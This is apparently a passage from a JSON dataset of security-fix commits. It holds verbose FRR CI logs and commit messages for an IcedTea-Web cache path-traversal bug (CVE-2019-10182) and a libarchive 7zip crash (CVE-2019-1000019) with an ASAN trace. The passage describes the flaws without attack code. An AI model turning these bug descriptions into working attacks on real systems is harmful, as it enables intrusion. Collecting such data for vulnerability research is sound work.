overridden (3 warnings)\n\n\n### Debian 9 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 9 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI021BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 14.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 14.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI001BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n-----------------------------\n### CLANG Static Analyzer Summary\n- Github Pull Request 3575, comparing to Git base SHA e82d19a\n- Base image data for Git e82d19a does not exist - compare skipped\n ## &#x1F49A; Basic BGPD CI results: SUCCESS, 0 tests failed\n\n<details>\n<summary>Results table</summary>\n\n_|_\n-|-\nResult               | SUCCESS git merge/3575 943d595a\nDate                 | 01/07/2019\nStart                | 13:03:03\nFinish               | 13:26:38\nRun-Time             | 23:35\nTotal                | 1813\nPass                 | 1813\nFail                 | 0\nValgrind-Errors      | 0\nValgrind-Loss        | 0\nDetails              | vncregress-2019-01-07-13:03:03.txt\nLog                  | autoscript-2019-01-07-13:05:24.log.bz2\n\nFor details, please contact louberger\n\n</details> # Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/\n\nThis is a comment from an EXPERIMENTAL automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n## Get source and apply patch from patchwork: Successful\n\n## Building Stage: Successful\n\n## Basic Tests: Failed\n__CentOS 7 rpm pkg check: Successful__\n__Ubuntu 12.04 deb pkg check: Successful__\n__IPv6 protocols on Ubuntu 14.04: Successful__\n__Ubuntu 16.04 deb pkg check: Successful__\n__CentOS 6 rpm pkg check: Successful__\n__Ubuntu 14.04 deb pkg check: Successful__\n__IPv4 ldp protocol on Ubuntu 16.04: Successful__\n__Addresssanitizer topotest: Successful__\n__Debian 8 deb pkg check: Successful__\n__Fedora 24 rpm pkg check: Successful__\n__IPv4 protocols on Ubuntu 14.04: Successful__\n__Debian 9 deb pkg check: Successful__\n__Static analyzer (clang): Successful__\n\n\n#### Topology tests on Ubuntu 18.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1804-6327/test\n\n__Topology Tests failed for Topology tests on Ubuntu 18.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 18:34:55,206 ERROR: ******************************************************************************\n    2019-01-07 18:34:55,206 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 18:34:55,206 ERROR: ******************************************************************************\n    2019-01-07 18:34:55,206 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 18:34:55,206 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 18:34:55,206 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 18:34:55,206 ERROR: FILE: scripts/check_close.py\n    2019-01-07 18:34:55,206 ERROR: 46   r3     Out of holddown +10.66 secs                              0    1\n    2019-01-07 18:34:55,207 ERROR: 47   r4     Out of holddown +10.56 secs                              0    1\n    2019-01-07 18:34:55,207 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 18:34:55,209 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 18:36:40,083 ERROR: ******************************************************************************\n    2019-01-07 18:36:40,084 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 18:36:40,084 ERROR: ******************************************************************************\n    2019-01-07 18:36:40,084 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 18:36:40,084 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 18:36:40,084 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 18:36:40,085 ERROR: FILE: scripts/check_close.py\n    2019-01-07 18:36:40,085 ERROR: 46   r3     Out of holddown +10.59 secs                              0    1\n    2019-01-07 18:36:40,085 ERROR: 47   r4     Out of holddown +10.01 secs                              0    1\n    2019-01-07 18:36:40,085 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 18:36:40,086 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1804/ErrorLog/log_topotests.txt\n\n#### Topology tests on Ubuntu 16.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1604-6327/test\n\n__Topology Tests failed for Topology tests on Ubuntu 16.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 10:35:16,685 ERROR: ******************************************************************************\n    2019-01-07 10:35:16,686 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 10:35:16,686 ERROR: ******************************************************************************\n    2019-01-07 10:35:16,686 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 10:35:16,686 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 10:35:16,686 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 10:35:16,686 ERROR: FILE: scripts/check_close.py\n    2019-01-07 10:35:16,686 ERROR: 46   r3     Out of holddown +10.27 secs                              0    1\n    2019-01-07 10:35:16,686 ERROR: 47   r4     Out of holddown +10.33 secs                              0    1\n    2019-01-07 10:35:16,687 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 10:35:16,690 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 10:36:50,395 ERROR: ******************************************************************************\n    2019-01-07 10:36:50,396 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 10:36:50,396 ERROR: ******************************************************************************\n    2019-01-07 10:36:50,396 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 10:36:50,396 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 10:36:50,397 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 10:36:50,397 ERROR: FILE: scripts/check_close.py\n    2019-01-07 10:36:50,397 ERROR: 46   r3     Out of holddown +10.23 secs                              0    1\n    2019-01-07 10:36:50,397 ERROR: 47   r4     Out of holddown +10.25 secs                              0    1\n    2019-01-07 10:36:50,397 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 10:36:50,400 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1604/ErrorLog/log_topotests.txt\n\n#### Topotest tests on Ubuntu 16.04 i386: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOI386-6327/test\n\n__Topology Tests failed for Topotest tests on Ubuntu 16.04 i386__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 10:35:07,943 ERROR: ******************************************************************************\n    2019-01-07 10:35:07,944 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 10:35:07,944 ERROR: ******************************************************************************\n    2019-01-07 10:35:07,944 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 10:35:07,944 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 10:35:07,944 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 10:35:07,944 ERROR: FILE: scripts/check_close.py\n    2019-01-07 10:35:07,944 ERROR: 46   r3     Out of holddown +10.11 secs                              0    1\n    2019-01-07 10:35:07,944 ERROR: 47   r4     Out of holddown +10.17 secs                              0    1\n    2019-01-07 10:35:07,945 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/output.log for details of errors\n    2019-01-07 10:35:07,947 ERROR: assert failed at \"bgp_rfapi_basic_sanity.test_bgp_rfapi_basic_sanity/test_check_close\": 2 tests failed\n    2019-01-07 10:36:41,323 ERROR: ******************************************************************************\n    2019-01-07 10:36:41,324 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 10:36:41,324 ERROR: ******************************************************************************\n    2019-01-07 10:36:41,324 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 10:36:41,324 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 10:36:41,324 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 10:36:41,324 ERROR: FILE: scripts/check_close.py\n    2019-01-07 10:36:41,324 ERROR: 46   r3     Out of holddown +10.17 secs                              0    1\n    2019-01-07 10:36:41,324 ERROR: 47   r4     Out of holddown +10.16 secs                              0    1\n    2019-01-07 10:36:41,324 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 10:36:41,326 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    *** defaultIntf: warning: lm has no interfaces\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOI386/ErrorLog/log_topotests.txt\n\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1804/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOU1604/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/TOPOI386/MemoryLeaks/\n-----------------------------\n## Warnings Generated during build:\n\n\n### Ubuntu 16.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI014BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 18.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 18.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/U1804AMD64/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 4 tags overridden (3 warnings, 1 info)\n\n\n### Ubuntu 16.04 i386 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 i386 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/U1604I386/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Debian 8 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 8 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI008BLD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Debian 9 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 9 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI021BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 14.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 14.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6327/artifact/CI001BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n-----------------------------\n### CLANG Static Analyzer Summary\n- Github Pull Request 3575, comparing to Git base SHA e82d19a\n- Base image data for Git e82d19a does not exist - compare skipped\n ## &#x1F49A; Basic BGPD CI results: SUCCESS, 0 tests failed\n\n<details>\n<summary>Results table</summary>\n\n_|_\n-|-\nResult               | SUCCESS git merge/3575 ef9aee14\nDate                 | 01/07/2019\nStart                | 15:30:36\nFinish               | 15:54:16\nRun-Time             | 23:40\nTotal                | 1813\nPass                 | 1813\nFail                 | 0\nValgrind-Errors      | 0\nValgrind-Loss        | 0\nDetails              | vncregress-2019-01-07-15:30:36.txt\nLog                  | autoscript-2019-01-07-15:31:20.log.bz2\n\nFor details, please contact louberger\n\n</details> # Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/\n\nThis is a comment from an EXPERIMENTAL automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n## Get source and apply patch from patchwork: Successful\n\n## Building Stage: Successful\n\n## Basic Tests: Failed\n__CentOS 6 rpm pkg check: Successful__\n__Static analyzer (clang): Successful__\n__IPv6 protocols on Ubuntu 14.04: Successful__\n__Ubuntu 16.04 deb pkg check: Successful__\n__Ubuntu 12.04 deb pkg check: Successful__\n__Fedora 24 rpm pkg check: Successful__\n__CentOS 7 rpm pkg check: Successful__\n__Addresssanitizer topotest: Successful__\n__Debian 8 deb pkg check: Successful__\n__IPv4 protocols on Ubuntu 14.04: Successful__\n__IPv4 ldp protocol on Ubuntu 16.04: Successful__\n__Debian 9 deb pkg check: Successful__\n__Ubuntu 14.04 deb pkg check: Successful__\n\n\n#### Topology tests on Ubuntu 18.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1804-6334/test\n\n__Topology Tests failed for Topology tests on Ubuntu 18.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 20:36:04,752 ERROR: ******************************************************************************\n    2019-01-07 20:36:04,753 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 20:36:04,753 ERROR: ******************************************************************************\n    2019-01-07 20:36:04,753 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 20:36:04,753 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 20:36:04,753 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 20:36:04,753 ERROR: FILE: scripts/check_close.py\n    2019-01-07 20:36:04,753 ERROR: 46   r3     Out of holddown +10.03 secs                              0    1\n    2019-01-07 20:36:04,753 ERROR: 47   r4     Out of holddown +10.08 secs                              0    1\n    2019-01-07 20:36:04,753 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 20:36:04,755 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOU1804/ErrorLog/log_topotests.txt\n\n#### Topotest tests on Ubuntu 16.04 i386: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOI386-6334/test\n\n__Topology Tests failed for Topotest tests on Ubuntu 16.04 i386__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 12:36:09,814 ERROR: ******************************************************************************\n    2019-01-07 12:36:09,815 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 12:36:09,815 ERROR: ******************************************************************************\n    2019-01-07 12:36:09,815 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 12:36:09,815 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 12:36:09,815 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 12:36:09,815 ERROR: FILE: scripts/check_close.py\n    2019-01-07 12:36:09,815 ERROR: 46   r3     Out of holddown +10.24 secs                              0    1\n    2019-01-07 12:36:09,815 ERROR: 47   r4     Out of holddown +10.15 secs                              0    1\n    2019-01-07 12:36:09,815 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 12:36:09,817 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    *** defaultIntf: warning: lm has no interfaces\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n    RTNETLINK answers: Invalid argument\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOI386/ErrorLog/log_topotests.txt\n\n#### Topology tests on Ubuntu 16.04 amd64: Failed\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-TOPOU1604-6334/test\n\n__Topology Tests failed for Topology tests on Ubuntu 16.04 amd64__:\n\n    *** defaultIntf: warning: r1 has no interfaces\n    2019-01-07 12:36:23,631 ERROR: ******************************************************************************\n    2019-01-07 12:36:23,632 ERROR: Test Target Summary                                                  Pass Fail\n    2019-01-07 12:36:23,632 ERROR: ******************************************************************************\n    2019-01-07 12:36:23,632 ERROR: FILE: scripts/add_routes.py\n    2019-01-07 12:36:23,632 ERROR: FILE: scripts/adjacencies.py\n    2019-01-07 12:36:23,632 ERROR: FILE: scripts/check_routes.py\n    2019-01-07 12:36:23,632 ERROR: FILE: scripts/check_close.py\n    2019-01-07 12:36:23,632 ERROR: 46   r3     Out of holddown +10.12 secs                              0    1\n    2019-01-07 12:36:23,632 ERROR: 47   r4     Out of holddown +10.09 secs                              0    1\n    2019-01-07 12:36:23,632 ERROR: See /tmp/topotests/bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/output.log for details of errors\n    2019-01-07 12:36:23,635 ERROR: assert failed at \"bgp_rfapi_basic_sanity_config2.test_bgp_rfapi_basic_sanity_config2/test_check_close\": 2 tests failed\n    *** defaultIntf: warning: lm has no interfaces\n\n   see full log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOU1604/ErrorLog/log_topotests.txt\n\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOU1804/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOI386/MemoryLeaks/\n__Topology Tests memory analysis:__ https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/TOPOU1604/MemoryLeaks/\n-----------------------------\n## Warnings Generated during build:\n\n\n### Debian 8 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 8 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/CI008BLD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 16.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/CI014BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 18.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 18.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/U1804AMD64/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 4 tags overridden (3 warnings, 1 info)\n\n\n### Debian 9 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 9 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/CI021BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 14.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 14.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/CI001BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 16.04 i386 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 i386 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6334/artifact/U1604I386/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n-----------------------------\n### CLANG Static Analyzer Summary\n- Github Pull Request 3575, comparing to Git base SHA e82d19a\n#### No Changes in Static Analysis warnings compared to base\n ## &#x1F49A; Basic BGPD CI results: SUCCESS, 0 tests failed\n\n<details>\n<summary>Results table</summary>\n\n_|_\n-|-\nResult               | SUCCESS git merge/3575 e3d16a4f\nDate                 | 01/07/2019\nStart                | 17:20:36\nFinish               | 17:44:32\nRun-Time             | 23:56\nTotal                | 1813\nPass                 | 1813\nFail                 | 0\nValgrind-Errors      | 0\nValgrind-Loss        | 0\nDetails              | vncregress-2019-01-07-17:20:36.txt\nLog                  | autoscript-2019-01-07-17:21:28.log.bz2\n\nFor details, please contact louberger\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/\n\nThis is a comment from an EXPERIMENTAL automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n-----------------------------\n## Warnings Generated during build:\n\n\n### Ubuntu 14.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 14.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/CI001BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Debian 8 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 8 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/CI008BLD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Debian 9 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Debian 9 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/CI021BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 16.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/CI014BUILD/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n### Ubuntu 18.04 amd64 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 18.04 amd64 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/U1804AMD64/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 4 tags overridden (3 warnings, 1 info)\n\n\n### Ubuntu 16.04 i386 build: Successful with additional warnings:\n__Debian Package lintian failed for Ubuntu 16.04 i386 build__:\n    (see full package build log at https://ci1.netdef.org/browse/FRR-FRRPULLREQ-6337/artifact/U1604I386/ErrorLog/log_lintian.txt)\n\n    W: frr: package-name-doesnt-match-sonames libfrr0 libfrrospfapiclient0\n    N: 3 tags overridden (3 warnings)\n\n\n-----------------------------\n### CLANG Static Analyzer Summary\n- Github Pull Request 3575, comparing to Git base SHA e82d19a\n#### No Changes in Static Analysis warnings compared to base",
            "pr_title_words": 8,
            "comments_words": 3525,
            "total_other_info_words": 3533
        },
        {
            "cve-id": "CVE-2019-10182",
            "commit_url": "https://github.com/AdoptOpenJDK/IcedTea-Web/commit/2ab070cdac087bd208f64fa8138bb709f8d7680c",
            "commit_msg": "Fixed bug when relative path (..) could leak up (even out of cache) - CVE-2019-10182\n\n* netx/net/sourceforge/jnlp/cache/CacheUtil.java: if path or query contains .. is saved to cache via its hash\n* netx/net/sourceforge/jnlp/util/FileUtils.java: added warning about different behavior on win/linux\n* tests/netx/unit/net/sourceforge/jnlp/cache/CacheUtilTest.java: added tests for hashing\n* tests/netx/unit/net/sourceforge/jnlp/runtime/JNLPClassLoaderTest.java:  added test for .. in path. Added test that verifies encoded .. (%2E%2E) do not leak from cahce\n* tests/netx/unit/net/sourceforge/jnlp/runtime/up.jnlp: example jnlp with .. full url\n* tests/netx/unit/net/sourceforge/jnlp/runtime/up.jnlp: example jnlp with encoded ..",
            "commit_msg_words": 80,
            "other_info": "fixing CVEs 2019- 10181, 10182, 10185 found by Imre Rad - master btw the https://github.com/AdoptOpenJDK/IcedTea-Web/pull/344/commits/140c98173599f87a8f0457abe04fc782d5d5f12d  is candidate for revert,  and fix the regression to make this test pass. The default codebase absence will make many no longer maintained apps to die So good to commit tomorrow?",
            "pr_title_words": 12,
            "comments_words": 34,
            "total_other_info_words": 46
        },
        {
            "cve-id": "CVE-2019-1000019",
            "commit_url": "https://github.com/libarchive/libarchive/commit/65a23f5dbee4497064e9bb467f81138a62b0dae1",
            "commit_msg": "7zip: fix crash when parsing certain archives\n\nFuzzing with CRCs disabled revealed that a call to get_uncompressed_data()\nwould sometimes fail to return at least 'minimum' bytes. This can cause\nthe crc32() invocation in header_bytes to read off into invalid memory.\n\nA specially crafted archive can use this to cause a crash.\n\nAn ASAN trace is below, but ASAN is not required - an uninstrumented\nbinary will also crash.\n\n==7719==ERROR: AddressSanitizer: SEGV on unknown address 0x631000040000 (pc 0x7fbdb3b3ec1d bp 0x7ffe77a51310 sp 0x7ffe77a51150 T0)\n==7719==The signal is caused by a READ memory access.\n    #0 0x7fbdb3b3ec1c in crc32_z (/lib/x86_64-linux-gnu/libz.so.1+0x2c1c)\n    #1 0x84f5eb in header_bytes (/tmp/libarchive/bsdtar+0x84f5eb)\n    #2 0x856156 in read_Header (/tmp/libarchive/bsdtar+0x856156)\n    #3 0x84e134 in slurp_central_directory (/tmp/libarchive/bsdtar+0x84e134)\n    #4 0x849690 in archive_read_format_7zip_read_header (/tmp/libarchive/bsdtar+0x849690)\n    #5 0x5713b7 in _archive_read_next_header2 (/tmp/libarchive/bsdtar+0x5713b7)\n    #6 0x570e63 in _archive_read_next_header (/tmp/libarchive/bsdtar+0x570e63)\n    #7 0x6f08bd in archive_read_next_header (/tmp/libarchive/bsdtar+0x6f08bd)\n    #8 0x52373f in read_archive (/tmp/libarchive/bsdtar+0x52373f)\n    #9 0x5257be in tar_mode_x (/tmp/libarchive/bsdtar+0x5257be)\n    #10 0x51daeb in main (/tmp/libarchive/bsdtar+0x51daeb)\n    #11 0x7fbdb27cab96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310\n    #12 0x41dd09 in _start (/tmp/libarchive/bsdtar+0x41dd09)\n\nThis was primarly done with afl and FairFuzz. Some early corpus entries\nmay have been generated by qsym.",
            "commit_msg_words": 174,
